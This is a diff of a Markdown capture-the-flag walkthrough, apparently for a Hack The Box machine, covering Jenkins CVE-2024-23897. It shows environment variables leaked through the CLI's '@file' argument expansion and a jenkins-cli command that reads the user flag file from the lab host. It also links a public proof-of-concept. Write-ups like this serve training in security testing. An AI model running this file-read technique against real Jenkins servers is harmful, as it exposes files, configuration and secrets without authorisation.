@@ -88,10 +88,7 @@ You will see the following outcome
 The outcome returned is a list of environment variables. At the end, the `help` command cannot interpretate `HOSTNAME=...`. So returns an error. Nonetheless, we obtain several paths and addresses.
 
 
-ERROR: No such command HOSTNAME=0f52c222a4ccJENKINS_UC_EXPERIMENTAL=
-
-https://updates.jenkins.io/experimental
-
+0. HOSTNAME=0f52c222a4ccJENKINS_UC_EXPERIMENTAL=https://updates.jenkins.io/experimental
 1. JAVA_HOME=/opt/java/openjdk
 2. JENKINS_INCREMENTALS_REPO_MIRROR=https://repo.jenkins-ci.org/incrementals
 3. COPY_REFERENCE_FILE_LOG=/var/jenkins_home/copy_reference_file.log
@@ -104,6 +101,20 @@ https://updates.jenkins.io/experimental
 10. JENKINS_HOME=/var/jenkins_home
 11. REF=/usr/share/jenkins/ref
 12. PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+Observe that we can analyze potential files in these environment variables, for exmaple, HOM, PATH, or JENKINS_HOME. Let' s try to find the user flag `user.txt` on these paths (I will only show the correct location to save time).
+
+```
+java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' help "@/var/jenkins_home/user.txt"
+```
+
+(pic10)
+
+Remember you have to introduce the `user.txt` filename to read it because the vulnerability is reading files, not paths. Usually user flags are located in $HOME directory in HTB.
+
+###Root flag
+
+
 
 ?Nonetheless, we don' t find any example of how to implement it. So let's look on Google " CVE-2024-23897 proof of concept" and you will find the following site: https://github.com/3yujw7njai/CVE-2024-23897?
 
